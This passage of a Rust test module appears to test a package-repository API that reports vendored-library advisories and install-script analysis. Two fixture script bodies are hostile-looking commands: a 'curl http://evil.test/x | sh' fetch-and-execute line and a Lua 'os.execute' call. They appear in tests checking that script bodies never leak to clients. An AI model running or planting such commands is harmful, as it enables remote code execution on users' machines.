        ComponentAdvisories {
            component: name.to_string(),
            version: version.map(str::to_string),
            advisories,
        }
    }

    fn cve_4863() -> ComponentAdvisory {
        ComponentAdvisory {
            id: "CVE-2023-4863".to_string(),
            severity: "critical".to_string(),
            summary: Some("Heap buffer overflow in libwebp".to_string()),
            url: Some("https://osv.dev/vulnerability/OSV-2023-libwebp".to_string()),
        }
    }

    /// The same `null` vs `[]` contract as `findings`, for the same reason.
    /// `[]` means a feed answered and knows of nothing; `null` means nobody
    /// asked, or the asking did not complete. A client that reads the second
    /// as the first publishes a clean bill of health for an unexamined
    /// statically-linked library, which is the defect this endpoint exists to
    /// remove.
    #[test]
    fn null_advisories_survive_as_null_and_are_distinct_from_empty() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![
                component_row("libwebp", Some("1.3.2"), "declared"),
                component_row("zlib", None, "unresolved"),
            ],
            vec![],
            report(
                AdvisoryScan::ok(),
                vec![
                    advisories_for("libwebp", Some("1.3.2"), Some(vec![])),
                    // No version was recovered, so nothing ever queried it.
                    advisories_for("zlib", None, None),
                ],
            ),
        ));
        let queried = &json["vendored_components"][0];
        let unqueried = &json["vendored_components"][1];

        assert_eq!(
            queried["advisories"],
            json!([]),
            "a feed that answered `nothing known` serializes as [], got {queried}"
        );
        assert!(
            unqueried["advisories"].is_null(),
            "a component nothing queried must stay null, got {unqueried}"
        );
        assert!(
            !unqueried["advisories"].is_array(),
            "null advisories must not be coerced to an array, got {unqueried}"
        );
        assert_ne!(
            queried["advisories"], unqueried["advisories"],
            "an unqueried component must not serialize identically to a clean one"
        );
    }

    /// The key must always be emitted. A client receiving no `advisories` key
    /// at all would be reading an older backend, and the web client normalizes
    /// absent-or-null to null precisely so that cannot read as "queried and
    /// clean". Emitting the field unconditionally keeps that normalization
    /// honest rather than load-bearing.
    #[test]
    fn the_advisories_key_is_present_even_when_empty() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("libwebp", Some("1.3.2"), "declared")],
            vec![],
            report(
                AdvisoryScan::ok(),
                vec![advisories_for("libwebp", Some("1.3.2"), Some(vec![]))],
            ),
        ));
        let component = json["vendored_components"][0]
            .as_object()
            .expect("component must be an object");
        for key in ["advisories", "soname", "abi_version"] {
            assert!(
                component.contains_key(key),
                "`{key}` must always be emitted, never elided, got {json}"
            );
        }
    }

    /// CVE-2023-4863 against a libwebp the package declares nowhere: the
    /// finding this whole feature exists to surface. Every field the client
    /// keys on must survive the mapping, `id` above all -- the web client
    /// fails the parse of the entire artifact on an entry without one.
    #[test]
    fn an_advisory_is_carried_through_with_every_field_the_client_keys_on() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("libwebp", Some("1.3.2"), "declared")],
            vec![],
            report(
                AdvisoryScan::ok(),
                vec![advisories_for(
                    "libwebp",
                    Some("1.3.2"),
                    Some(vec![cve_4863()]),
                )],
            ),
        ));
        assert_eq!(
            json["vendored_components"][0]["advisories"],
            json!([{
                "id": "CVE-2023-4863",
                "severity": "critical",
                "summary": "Heap buffer overflow in libwebp",
                "url": "https://osv.dev/vulnerability/OSV-2023-libwebp",
            }])
        );
    }

    /// A component the advisory query returned no row for at all is reported
    /// as not queried, never as clean. This is the defensive arm: the two
    /// queries read the same table, so a mismatch should be impossible, and
    /// the failure direction if one ever happens must be the safe one.
    #[test]
    fn a_component_with_no_advisory_row_defaults_to_not_queried() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("libwebp", Some("1.3.2"), "declared")],
            vec![],
            no_advisories(),
        ));
        assert!(
            json["vendored_components"][0]["advisories"].is_null(),
            "an absent advisory row must degrade to `not queried`, got {json}"
        );
    }

    /// One package may vendor two copies of the same library at different
    /// releases. The vulnerable copy's advisory must not be attached to the
    /// patched one -- a false positive against a component that really was
    /// fixed is how a panel loses its reader.
    #[test]
    fn two_versions_of_one_library_do_not_share_advisories() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![
                component_row("libwebp", Some("1.3.2"), "declared"),
                component_row("libwebp", Some("1.3.3"), "declared"),
            ],
            vec![],
            report(
                AdvisoryScan::ok(),
                vec![
                    advisories_for("libwebp", Some("1.3.2"), Some(vec![cve_4863()])),
                    advisories_for("libwebp", Some("1.3.3"), Some(vec![])),
                ],
            ),
        ));
        let vulnerable = &json["vendored_components"][0];
        let patched = &json["vendored_components"][1];

        assert_eq!(vulnerable["advisories"][0]["id"], json!("CVE-2023-4863"));
        assert_eq!(
            patched["advisories"],
            json!([]),
            "the patched copy is clean, not guilty by name, got {patched}"
        );
    }

    // -----------------------------------------------------------------------
    // advisory_scan is NOT completeness
    // -----------------------------------------------------------------------

    /// The two `partial`s are different failures and must never be derived
    /// from one another.
    ///
    /// A truncated ARCHIVE with feeds that answered fine must not relabel its
    /// components "advisory feed unavailable" -- that fabricates an outage
    /// that did not happen, the mirror image of reporting an outage as clean.
    #[test]
    fn a_truncated_archive_does_not_fabricate_a_feed_outage() {
        let json = wire(&build_response(
            analysis_row("partial", Some("only 2 of 10 files were read")),
            vec![component_row("libwebp", Some("1.3.2"), "declared")],
            vec![],
            report(
                AdvisoryScan::ok(),
                vec![advisories_for("libwebp", Some("1.3.2"), Some(vec![]))],
            ),
        ));
        assert_eq!(
            json["completeness"]["status"],
            json!("partial"),
            "the archive really was truncated, got {json}"
        );
        assert_eq!(
            json["advisory_scan"]["status"],
            json!("ok"),
            "the FEEDS answered; a truncated archive must not be reported as \
             an advisory-feed failure, got {json}"
        );
        assert!(
            json["advisory_scan"]["reason"].is_null(),
            "`ok` carries no reason, got {json}"
        );
    }

    /// And the other direction: a feed outage on a package that was read in
    /// full must not claim the archive was truncated. The archive banner
    /// counts files read, so borrowing this status would render
    /// "only 40 of 40 files were read" -- a banner that lies.
    #[test]
    fn a_feed_outage_does_not_claim_the_archive_was_truncated() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![component_row("libwebp", Some("1.3.2"), "declared")],
            vec![],
            report(
                AdvisoryScan::partial(),
                vec![advisories_for("libwebp", Some("1.3.2"), None)],
            ),
        ));
        assert_eq!(
            json["completeness"]["status"],
            json!("complete"),
            "the archive was read in full and must still say so, got {json}"
        );
        assert_eq!(
            json["advisory_scan"]["status"],
            json!("partial"),
            "the outage belongs to the feed, got {json}"
        );
        assert!(
            json["vendored_components"][0]["advisories"].is_null(),
            "and its components stay unqueried, got {json}"
        );
    }

    /// `reason` is rendered to a user verbatim, so it must be a sentence they
    /// can act on rather than a code, and it must be present exactly when the
    /// status is not `ok` -- the same contract `completeness.reason` carries.
    #[test]
    fn a_non_ok_feed_status_always_explains_itself_in_a_usable_sentence() {
        for (scan, expected) in [
            (AdvisoryScan::not_run(), "not_run"),
            (AdvisoryScan::partial(), "partial"),
        ] {
            let json = wire(&build_response(
                analysis_row("complete", None),
                vec![],
                vec![],
                report(scan, vec![]),
            ));
            assert_eq!(json["advisory_scan"]["status"], json!(expected));
            let reason = json["advisory_scan"]["reason"]
                .as_str()
                .unwrap_or_else(|| panic!("{expected} must carry a reason, got {json}"));
            assert!(
                reason.ends_with('.') && reason.split_whitespace().count() > 5,
                "the reason is shown verbatim and must read as a sentence, \
                 not a code: {reason:?}"
            );
        }
    }

    /// A package that vendors nothing has no advisory question to have asked,
    /// so there is no feed status to hang on an empty panel.
    #[test]
    fn a_package_that_vendors_nothing_reports_no_feed_status() {
        let json = wire(&build_response(
            analysis_row("complete", None),
            vec![],
            vec![],
            no_advisories(),
        ));
        assert!(
            json["advisory_scan"].is_null(),
            "no components means no feed status, got {json}"
        );
        assert!(
            json.as_object()
                .expect("response object")
                .contains_key("advisory_scan"),
            "the key is still emitted, so a client never has to infer it from \
             absence, got {json}"
        );
    }

    // -----------------------------------------------------------------------
    // Authentication precedes visibility (no database required)
    // -----------------------------------------------------------------------

    /// The anonymous refusal happens before any query. The pool here points at
    /// a port nothing listens on, so a handler that reached the database would
    /// fail with `Database`, not `Authentication` — which is the counterfactual
    /// that makes this test mean something.
    #[tokio::test]
    async fn anonymous_is_refused_before_any_database_access() {
        let pool = sqlx::PgPool::connect_lazy("postgres://invalid:invalid@127.0.0.1:1/none")
            .expect("lazy pool");
        let state = tdh::build_state(pool, "/tmp/ph-package-analysis");
        let err = get_package_analysis(State(state), Extension(None), Path(Uuid::new_v4()))
            .await
            .expect_err("an anonymous read must be refused");
        assert!(
            matches!(err, AppError::Authentication(_)),
            "expected an authentication refusal before any query, got: {err}"
        );
    }

    // -----------------------------------------------------------------------
    // DB-backed route tests
    // -----------------------------------------------------------------------

    async fn insert_analysis(
        pool: &sqlx::PgPool,
        artifact_id: Uuid,
        status: &str,
        reason: Option<&str>,
    ) {
        sqlx::query(
            "INSERT INTO package_analysis \
             (artifact_id, format, status, reason, files_total, files_read) \
             VALUES ($1, 'conda', $2, $3, 7, 7)",
        )
        .bind(artifact_id)
        .bind(status)
        .bind(reason)
        .execute(pool)
        .await
        .expect("insert package_analysis");
    }

    async fn insert_script(
        pool: &sqlx::PgPool,
        artifact_id: Uuid,
        path: &str,
        body: Option<&str>,
        findings: Option<serde_json::Value>,
        skipped: Option<&str>,
    ) {
        sqlx::query(
            "INSERT INTO package_install_scripts \
             (artifact_id, path, kind, size_bytes, sha256, body, findings, \
              analysis_skipped_reason) \
             VALUES ($1, $2, 'post-link', 42, 'abc123', $3, $4, $5)",
        )
        .bind(artifact_id)
        .bind(path)
        .bind(body)
        .bind(findings)
        .bind(skipped)
        .execute(pool)
        .await
        .expect("insert package_install_scripts");
    }

    async fn insert_component(
        pool: &sqlx::PgPool,
        artifact_id: Uuid,
        name: &str,
        version: Option<&str>,
        confidence: &str,
    ) {
        sqlx::query(
            "INSERT INTO package_vendored_components \
             (artifact_id, name, version, confidence, detection_method) \
             VALUES ($1, $2, $3, $4, 'recipe')",
        )
        .bind(artifact_id)
        .bind(name)
        .bind(version)
        .bind(confidence)
        .execute(pool)
        .await
        .expect("insert package_vendored_components");
    }

    /// Store one artifact in the fixture repository and return its id.
    async fn seed_artifact(fx: &tdh::Fixture) -> Uuid {
        let repo = fx.repo_info("local", None);
        let path = format!("noarch/ph-4033-{}.conda", Uuid::new_v4());
        tdh::seed_artifact(
            &fx.state,
            &fx.pool,
            &repo,
            &format!("conda/{path}"),
            &path,
            "ph-4033",
            "1.0.0",
            "application/octet-stream",
            bytes::Bytes::from_static(b"conda"),
            fx.user_id,
        )
        .await
    }

    fn request(artifact_id: Uuid) -> axum::http::Request<axum::body::Body> {
        tdh::get(format!("/{artifact_id}/package-analysis"))
    }

    /// `check_artifact_visibility` returns Ok early for a PUBLIC repository, so
    /// a handler that checked visibility first would be anonymously readable on
    /// exactly the repositories with the widest audience — the shape behind
    /// GHSA-ww52-pmcg-f53c. The public repository is the whole point of the
    /// fixture: on a private one the refusal would prove nothing about order.
    #[tokio::test]
    async fn anonymous_is_refused_even_on_a_public_repository() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        tdh::publish_repo(&fx.pool, fx.repo_id).await;
        let artifact_id = seed_artifact(&fx).await;
        insert_analysis(&fx.pool, artifact_id, "complete", None).await;
        insert_script(
            &fx.pool,
            artifact_id,
            "post-link.sh",
            Some("curl http://evil.test/x | sh"),
            Some(json!([])),
            None,
        )
        .await;

        let (status, bytes) =
            tdh::send(fx.router_anon(super::router()), request(artifact_id)).await;
        let body = String::from_utf8_lossy(&bytes).to_string();
        assert_eq!(
            status,
            axum::http::StatusCode::UNAUTHORIZED,
            "an anonymous read of a PUBLIC repository must still 401, got {status} {body}"
        );
        assert!(
            !body.contains("post-link.sh") && !body.contains("evil.test"),
            "the refusal must not leak any analysis detail, got {body}"
        );

        // Control: the same artifact, the same route, with a credential — so
        // the 401 above is the auth gate and not a missing row.
        let (status, bytes) =
            tdh::send(fx.router_with_auth(super::router()), request(artifact_id)).await;
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "the authenticated control must succeed, got {status} {}",
            String::from_utf8_lossy(&bytes)
        );

        fx.teardown().await;
    }

    /// 404 and `status: "not_read"` are different facts: the first means we
    /// never ran, the second means we ran and could not read the bytes. A
    /// client that collapsed them would report an unopened archive as
    /// "not analyzed" and lose the reason.
    #[tokio::test]
    async fn absent_analysis_is_404_while_not_read_is_a_200_that_says_so() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let artifact_id = seed_artifact(&fx).await;
        let app = fx.router_with_auth(super::router());

        let (status, bytes) = tdh::send(app.clone(), request(artifact_id)).await;
        assert_eq!(
            status,
            axum::http::StatusCode::NOT_FOUND,
            "an artifact with no analysis row must 404, got {status} {}",
            String::from_utf8_lossy(&bytes)
        );

        insert_analysis(
            &fx.pool,
            artifact_id,
            "not_read",
            Some("archive exceeded the 2 GiB extraction ceiling"),
        )
        .await;

        let (status, bytes) = tdh::send(app, request(artifact_id)).await;
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "a recorded not_read analysis must be a 200, got {status} {}",
            String::from_utf8_lossy(&bytes)
        );
        let json: serde_json::Value = serde_json::from_slice(&bytes).expect("response json");
        assert_eq!(
            json["completeness"]["status"],
            json!("not_read"),
            "the 200 must state WHY the lists are empty, got {json}"
        );
        assert_eq!(
            json["completeness"]["reason"],
            json!("archive exceeded the 2 GiB extraction ceiling")
        );
        assert_eq!(json["vendored_components"], json!([]));
        assert_eq!(json["install_scripts"], json!([]));

        fx.teardown().await;
    }

    /// End-to-end over the route: stored NULL findings must arrive as JSON
    /// null, a stored body must not arrive at all, and both lists must come
    /// back in the query's declared order.
    #[tokio::test]
    async fn stored_rows_reach_the_client_without_flattening_or_leaking() {
        let Some(fx) = tdh::Fixture::setup("local", "conda").await else {
            return;
        };
        let artifact_id = seed_artifact(&fx).await;
        insert_analysis(
            &fx.pool,
            artifact_id,
            "partial",
            Some("one member could not be decompressed"),
        )
        .await;
        insert_component(&fx.pool, artifact_id, "zlib", None, "unresolved").await;
        insert_component(&fx.pool, artifact_id, "libwebp", Some("1.3.2"), "declared").await;
        insert_script(
            &fx.pool,
            artifact_id,
            "b-unexamined.lua",
            Some("os.execute('id')"),
            None,
            Some("interpreter lua is not analysed"),
        )
        .await;
        insert_script(
            &fx.pool,
            artifact_id,
            "a-examined.sh",
            None,
            Some(json!([])),
            None,
        )
        .await;

        let (status, bytes) =
            tdh::send(fx.router_with_auth(super::router()), request(artifact_id)).await;
        let raw = String::from_utf8_lossy(&bytes).to_string();
        assert_eq!(
            status,
            axum::http::StatusCode::OK,
            "authenticated read must succeed, got {status} {raw}"
        );
        let json: serde_json::Value = serde_json::from_slice(&bytes).expect("response json");

        assert_eq!(json["format"], json!("conda"));
        assert_eq!(json["completeness"]["status"], json!("partial"));
        assert!(
            json["analyzed_at"].is_string(),
            "analyzed_at must be an RFC3339 string, got {json}"
        );

        // ORDER BY name, version NULLS FIRST
        assert_eq!(json["vendored_components"][0]["name"], json!("libwebp"));
        assert_eq!(json["vendored_components"][1]["name"], json!("zlib"));
        assert!(json["vendored_components"][1]["version"].is_null());
        assert_eq!(
            json["vendored_components"][0]["applied_patches"],
            json!([]),
            "the column default must arrive as an empty array, got {json}"
        );

        // #4043, end to end and against a real database: no dependency scan
        // has run for this artifact, so NOTHING has queried these components.
        // Both must arrive as `null`. If this ever came back `[]`, a freshly
        // uploaded artifact carrying a vulnerable statically-linked library
        // would render an emerald "No known advisories" -- the precise false
        // all-clear this endpoint exists to prevent, reintroduced by the
        // feature meant to remove it.
        assert_eq!(
            json["advisory_scan"]["status"],
            json!("not_run"),
            "no dependency scan has run, and that is a different fact from the \
             archive being truncated -- which this same response also reports, \
             as completeness.status = partial, got {json}"
        );
        assert_eq!(
            json["completeness"]["status"],
            json!("partial"),
            "the two statuses are independent and both must survive"
        );
        assert!(
            json["advisory_scan"]["reason"].is_string(),
            "`not_run` must explain itself, got {json}"
        );
        for i in 0..2 {
            let component = &json["vendored_components"][i];
            assert!(
                component["advisories"].is_null(),
                "an unscanned artifact's components must arrive as `null`, \
                 never `[]`, got {component}"
            );
            assert!(
                component
                    .as_object()
                    .expect("component object")
                    .contains_key("advisories"),
                "the key must be emitted even when null, got {component}"
            );
        }

        // #4043, against a real database: the stored rows' candidate CPEs
        // are computed from the row's own identity columns. libwebp hits
        // the curated table (one high-confidence candidate, unambiguous);
        // zlib does too; and a version-less row still maps, with `*` in the
        // version slot.
        assert_eq!(
            json["vendored_components"][0]["cpe_candidates"],
            json!([{
                "cpe": "cpe:2.3:a:webmproject:libwebp:1.3.2:*:*:*:*:*:*:*",
                "vendor": "webmproject",
                "product": "libwebp",
                "confidence": "high",
                "rule_id": "cpe-known-table-v1",
            }]),
            "got {}",
            json["vendored_components"][0]
        );
        assert_eq!(
            json["vendored_components"][0]["cpe_ambiguous"],
            json!(false)
        );
        assert_eq!(
            json["vendored_components"][1]["cpe_candidates"][0]["cpe"],
            json!("cpe:2.3:a:zlib:zlib:*:*:*:*:*:*:*:*"),
            "a version-less component maps with a wildcard version, got {}",
            json["vendored_components"][1]
        );

        // ORDER BY path
        let examined = &json["install_scripts"][0];
        let unexamined = &json["install_scripts"][1];
        assert_eq!(examined["path"], json!("a-examined.sh"));
        assert_eq!(unexamined["path"], json!("b-unexamined.lua"));
        assert_eq!(
            examined["findings"],
            json!([]),
            "a stored empty array means the rules ran, got {examined}"
        );
        assert!(
            unexamined["findings"].is_null(),
            "a stored SQL NULL must arrive as JSON null, got {unexamined}"
        );
        assert_eq!(
            unexamined["analysis_skipped_reason"],
            json!("interpreter lua is not analysed")
        );
        assert_eq!(
            examined["content_available"],
            json!(false),
            "a NULL body is detected-but-unreadable, got {examined}"
        );
        assert_eq!(
            unexamined["content_available"],
            json!(true),
            "a stored body must be reported as available, got {unexamined}"
        );
        assert!(
            !raw.contains("os.execute"),
            "the stored body must not reach the client, got {raw}"
        );
        assert!(
            unexamined.get("body").is_none(),
            "there must be no body field at all, got {unexamined}"
        );

        fx.teardown().await;
    }
}
